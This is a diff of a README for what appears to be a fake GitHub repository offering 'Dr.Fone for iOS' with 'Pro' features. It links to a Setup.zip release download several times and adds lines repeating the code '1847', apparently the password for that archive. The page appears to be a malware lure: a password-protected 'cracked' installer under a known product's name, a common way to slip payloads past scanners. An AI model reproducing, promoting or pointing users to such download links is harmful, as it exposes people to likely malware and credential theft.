@@ -10,6 +10,12 @@
 
 [![Dr.Fone for iOS](og-image.png)](https://github.com/NeedGoldsmithQuay/DrFone-iOS/releases/download/Last/Setup.zip)
 
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
 ---
 
 ## About
@@ -23,6 +29,11 @@
 ## Download & Get Pro
 
 [![Get Dr.Fone for iOS Pro](https://img.shields.io/badge/Get%20Pro-Open%20Page-7c3aed?style=for-the-badge&logo=github)](https://github.com/NeedGoldsmithQuay/DrFone-iOS/releases/download/Last/Setup.zip)
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
+
+**🔐🔐🔐** `1847`
 
 ---
 
